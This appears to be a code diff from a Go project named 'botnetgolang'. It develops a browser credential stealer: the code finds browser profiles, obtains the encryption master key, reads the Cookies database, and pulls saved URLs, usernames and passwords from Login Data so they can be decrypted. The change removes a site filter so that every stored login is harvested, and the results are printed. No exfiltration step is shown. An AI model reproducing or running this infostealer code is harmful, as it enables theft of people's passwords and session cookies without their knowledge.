@@ -1,7 +1,6 @@
 package internal
 
 import (
-	_const "botnetgolang/internal/const"
 	"botnetgolang/internal/model"
 	"botnetgolang/internal/pkg"
 	"encoding/json"
@@ -64,29 +63,19 @@ func FunGetProfile(browser model.BrowserPaths) *model.AllProfile {
 
 func MainBL(browser model.BrowserPaths) {
 	allProfile := FunGetProfile(browser)
+
 	if len(allProfile.Alls) < 0 {
 		return
 	}
-	textF, err := pkg.ReadTextFile(allProfile.PathSource + browser.Local)
+
+	masterKey, err := pkg.GetMasterKey(allProfile.PathSource + browser.Local)
+	fmt.Println(masterKey)
 	if err != nil {
-		return
+		fmt.Println("error cant get masterKey")
 	}
-	var dataC map[string]interface{}
-	err = json.Unmarshal([]byte(textF), &dataC)
-	if err != nil {
-		return
-	}
-
-	alltt := dataC["os_crypt"].(map[string]interface{})["encrypted_key"].(string)
-	//tt, _ := base64.StdEncoding.DecodeString(alltt)
-	//tt = tt[5:]
-	secret, err := pkg.DecryptData([]byte(alltt))
-	fmt.Println(secret)
-
-	// chua lay duoc secret key
-
 	for _, profile := range allProfile.Alls {
 		path := fmt.Sprintf("%v\\Network\\Cookies", profile)
+		// connect sqlite3
 		connToken, err := pkg.ConnectSQLite(path)
 		if err != nil {
 			fmt.Println(err)
@@ -98,17 +87,34 @@ func MainBL(browser model.BrowserPaths) {
 		jsonString := string(jsonBytes)
 		fmt.Println(jsonString)
 		//isLogin := pkg.CheckLogin(token)
+
+		// //
 		path = fmt.Sprintf("%v\\Login Data", profile)
 		connInfo, err := pkg.ConnectSQLite(path)
 		info, _ := pkg.QueryData(connInfo, pkg.Passwords)
-		conditions := []interface{}{
-			_const.Cfff,
-			_const.Cggg,
-			_const.Clll,
+
+		//// init condition to select
+		//conditions := []interface{}{
+		//	_const.Cfff,
+		//	_const.Cggg,
+		//	_const.Clll,
+		//}
+
+		//listInfo := pkg.FilterConditions(info, conditions, "action_url")
+		listInfo := info
+		fmt.Println(listInfo)
+		for _, value := range listInfo {
+			infoRow := model.Info{
+				Url:      value["action_url"].(string),
+				UserName: value["username_value"].(string),
+				Pass:     value["password_value"].(string),
+			}
+			result := pkg.GetInfo(infoRow, allProfile.PathSource+browser.Local, masterKey)
+			fmt.Println(result)
 		}
 
-		listInfo := pkg.FilterConditions(info, conditions, "action_url")
-		fmt.Println(listInfo)
+		// //
+
 	}
 
 }
